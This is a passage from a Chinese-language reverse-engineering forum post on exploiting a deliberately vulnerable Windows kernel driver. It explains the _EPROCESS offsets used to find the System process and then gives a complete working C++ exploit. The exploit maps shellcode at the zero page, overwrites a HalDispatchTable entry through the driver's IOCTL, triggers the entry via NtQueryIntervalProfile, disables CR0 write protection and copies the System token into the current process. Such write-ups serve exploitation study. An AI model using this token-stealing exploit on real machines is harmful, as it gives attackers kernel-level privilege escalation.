
```
kd> dt _EPROCESS

ntdll!_EPROCESS

   +0x000 Pcb              : _KPROCESS

   +0x06c ProcessLock      : _EX_PUSH_LOCK

   +0x070 CreateTime       : _LARGE_INTEGER

   +0x078 ExitTime         : _LARGE_INTEGER

   +0x080 RundownProtect   : _EX_RUNDOWN_REF

   +0x084 UniqueProcessId  : Ptr32 Void

   +0x088 ActiveProcessLinks : _LIST_ENTRY

   +0x090 QuotaUsage       : [3] Uint4B

   +0x09c QuotaPeak        : [3] Uint4B

   +0x0a8 CommitCharge     : Uint4B

   +0x0ac PeakVirtualSize  : Uint4B

   +0x0b0 VirtualSize      : Uint4B

   +0x0b4 SessionProcessLinks : _LIST_ENTRY

   +0x0bc DebugPort        : Ptr32 Void

   +0x0c0 ExceptionPort    : Ptr32 Void

   +0x0c4 ObjectTable      : Ptr32 _HANDLE_TABLE

   +0x0c8 Token            : _EX_FAST_REF

   +0x0cc WorkingSetLock   : _FAST_MUTEX
```

其中需要注意的三个成员是

|  |  |  |
| --- | --- | --- |
| **偏移** | **成员** | **含义** |
| `0x84` | `UniqueProcessId` | 进程PID |
| `0x88` | `ActiveProcessLinks` | 双向链表可以用来遍历进程 |
| `0xC8` | `Token` | 保存了进程的令牌 |

所以作者给的ShellCode的提权办法是通过`0x88`这个成员来遍历所有的进程，去寻找System。因为System进程的PID都是等于4，如下图所示，所以通过判断`0x84`保存的进程PID是否是4来判断是否找到了System进程。随后将System进程的`Token`赋值给本进程这就完成了提权。如果对这个遍历进程的原理不太清楚的可以看下这一篇文章，下面有关于这种进程遍历原理的描述[进程隐藏技术](https://bbs.pediy.com/thread-269919.htm)。

# 五.运行结果

完整的完成漏洞利用达到提权的代码如下

```
// exploit.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。

//



#include <cstdio>

#include <cstdlib>

#include <windows.h>

#include "ntapi.h"

#pragma comment(linker, "/defaultlib:ntdll.lib")



#define LINK_NAME "\\\\.\\ExploitMeLink"

#define IOCTRL_BASE 0x800

#define MYIOCTRL_CODE(i) CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE + i, METHOD_NEITHER, FILE_ANY_ACCESS)	// 读写方式是其他类型

#define CTL_EXPLOIT_ME MYIOCTRL_CODE(0)

#define INPUT_BUFFER_LENGTH 4

#define OUT_BUFFER_LENGTH 4

#define PAGE_SIZE 0x1000

#define KERNEL_NAME_LENGTH 0X0D



void ShowError(PCHAR msg, NTSTATUS status);

NTSTATUS Ring0ShellCode(ULONG InformationClass, ULONG BufferSize, PVOID Buffer, PULONG ReturnedLength);



BOOL g_bIsExecute = FALSE;



int main()

{

	NTSTATUS status = STATUS_SUCCESS;

	HANDLE hDevice = NULL;

	DWORD dwReturnLength = 0, ShellCodeSize = PAGE_SIZE;

	PVOID ShellCodeAddress = NULL;

	PSYSTEM_MODULE_INFORMATION pModuleInformation = NULL;

	DWORD dwImageBase = 0;

	PVOID pMappedBase = NULL;

	UCHAR szImageName[KERNEL_NAME_LENGTH] = { 0 };

	UNICODE_STRING uDllName;

	PVOID pHalDispatchTable = NULL, pXHalQuerySystemInformation = NULL;

	DWORD dwDllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;

	

	// 获得0地址的内存

	ShellCodeAddress = (PVOID)sizeof(ULONG);

	status = NtAllocateVirtualMemory(NtCurrentProcess(), 

									 &ShellCodeAddress,

									 0,

									 &ShellCodeSize,

								     MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,

									 PAGE_EXECUTE_READWRITE);

	if (!NT_SUCCESS(status))

	{

		printf("NtAllocateVirtualMemory Error 0x%X\n", status);

		goto exit;

	}

	

	// 将ShellCode写到申请的0地址空间中

	RtlMoveMemory(ShellCodeAddress, (PVOID)Ring0ShellCode, ShellCodeSize);	

	



	// 此时dwReturnLength是0，所以函数会由于长度为0执行失败

	// 然后系统会在第四个参数指定的地址保存需要的内存大小

	status = ZwQuerySystemInformation(SystemModuleInformation,

									  pModuleInformation,

									  dwReturnLength,

									  &dwReturnLength);



	if (status != STATUS_INFO_LENGTH_MISMATCH)

	{

		ShowError("ZwQuerySystemInformation", status);

		goto exit;

	}



	// 按页大小对齐

	dwReturnLength = (dwReturnLength & 0xFFFFF000) + PAGE_SIZE * sizeof(ULONG);

	pModuleInformation = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, 

																  dwReturnLength, 

																  MEM_COMMIT | MEM_RESERVE,

																  PAGE_READWRITE);

	if (!pModuleInformation)

	{

		printf("VirtualAlloc Error");

		goto exit;

	}



	status = ZwQuerySystemInformation(SystemModuleInformation,

									  pModuleInformation,

									  dwReturnLength,

									  &dwReturnLength);

	if (!NT_SUCCESS(status))

	{

		ShowError("ZwQuerySystemInformation", status);

		goto exit;

	}

	

	// 模块加载的基地址

	dwImageBase = (DWORD)(pModuleInformation->Module[0].Base);



	// 获取模块名

	RtlMoveMemory(szImageName,

				  (PVOID)(pModuleInformation->Module[0].ImageName + pModuleInformation->Module[0].PathLength),

		          KERNEL_NAME_LENGTH);

	// 转换为UNICODE_STRING类型

	RtlCreateUnicodeStringFromAsciiz(&uDllName, (PUCHAR)szImageName);



	status = (NTSTATUS)LdrLoadDll(NULL,

								  &dwDllCharacteristics,

								  &uDllName,

								  &pMappedBase);



	if (!NT_SUCCESS(status))

	{

		ShowError("LdrLoadDll", status);

		goto exit;

	}



	// 获取内核HalDispatchTable函数表地址

	pHalDispatchTable = GetProcAddress((HMODULE)pMappedBase, "HalDispatchTable");



	if (pHalDispatchTable == NULL)

	{

		printf("GetProcAddress Error\n");

		goto exit;

	}



	pHalDispatchTable = (PVOID)((DWORD)pHalDispatchTable - (DWORD)pMappedBase + dwImageBase);

	pXHalQuerySystemInformation = (PVOID)((DWORD)pHalDispatchTable + sizeof(ULONG));



	// 打开驱动设备

	hDevice = CreateFile(LINK_NAME,

						 GENERIC_READ | GENERIC_WRITE,

						 0,

						 NULL,

						 OPEN_EXISTING,

						 FILE_ATTRIBUTE_NORMAL,

						 0);

	if (hDevice == INVALID_HANDLE_VALUE)

	{

		printf("CreateFile Error");

		goto exit;

	}





	DWORD dwInput = 0;

	// 与驱动设备进行交互

	if (!DeviceIoControl(hDevice, 

		                 CTL_EXPLOIT_ME, 

		                 &dwInput, 

		                 INPUT_BUFFER_LENGTH,

						 pXHalQuerySystemInformation,

						 OUT_BUFFER_LENGTH,

		                 &dwReturnLength,

						 NULL))

	{

		printf("DeviceIoControl Error");

		goto exit;

	}



	status = NtQueryIntervalProfile(ProfileTotalIssues, NULL);

	if (!NT_SUCCESS(status))

	{

		ShowError("NtQueryIntervalProfile", status);

		goto exit;

	}



	if (g_bIsExecute) printf("Ring0 代码执行完成\n");



exit:

	if (pModuleInformation) VirtualFree(pModuleInformation, dwReturnLength, MEM_DECOMMIT | MEM_RELEASE);

	if (hDevice) NtClose(hDevice);

	if (pMappedBase) LdrUnloadDll(pMappedBase);

	system("pause");

	return 0;

}



NTSTATUS Ring0ShellCode(ULONG InformationClass, ULONG BufferSize, PVOID Buffer, PULONG ReturnedLength)

{

	// 关闭页保护

	__asm

	{

		cli

		mov eax, cr0

		and eax, ~0x10000

		mov cr0, eax

	}



	__asm

	{

		// 取当前线程

		mov eax, 0xFFDFF124

		mov eax, [eax]

		// 取线程对应的EPROCESS

		mov esi, [eax + 0x220]

		mov eax, esi

searchXp:

		mov eax, [eax + 0x88]

		sub eax, 0x88

		mov edx, [eax + 0x84]

		cmp edx, 0x4

		jne searchXp

		mov eax, [eax + 0xC8]

		mov [esi + 0xC8], eax

	}



	// 开起页保护

	__asm

	{

		mov eax, cr0

		or eax, 0x10000

		mov cr0, eax

		sti

	}



	g_bIsExecute = TRUE;

}



void ShowError(PCHAR msg, NTSTATUS status)

{

	printf("%s Error 0x%X\n", msg, status);

}
```

可以看到，最终程序成功获得了System的权限

![](https://bbs.kanxue.com/upload/attach/202110/835440_VGPTEYUF9HYEECF.jpg)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2022-5-19 11:44 被1900编辑 ，原因： [#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm) [#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm) [#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)

上传的附件：

- [`ntdll.lib`](javascript:void(0);)（294.70kb，14次下载）
- [`ntapi.h`](javascript:void(0);)（71.63kb，14次下载）
